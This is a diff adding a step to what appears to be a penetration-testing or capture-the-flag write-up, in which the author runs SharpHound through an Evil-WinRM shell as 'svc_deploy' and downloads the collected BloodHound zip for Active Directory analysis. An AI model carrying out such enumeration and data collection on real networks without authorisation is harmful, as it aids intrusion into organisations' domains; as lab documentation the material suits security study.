@@ -330,3 +330,18 @@ Info: Establishing connection to remote endpoint
 ```
 Now ill upload sharphound then ingest this into bloodhound
 
+```python
+*Evil-WinRM* PS C:\Users\svc_deploy> .\SharpHound.exe -c All
+
+...[SNIP]...
+
+*Evil-WinRM* PS C:\Users\svc_deploy> download 20260613200441_BloodHound.zip
+                                        
+Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command
+                                        
+Info: Downloading C:\Users\svc_deploy\20260613200441_BloodHound.zip to 20260613200441_BloodHound.zip
+                                        
+Info: Download successful!
+```
+Now i can run bloodhound and ingest this into bloodhound
+
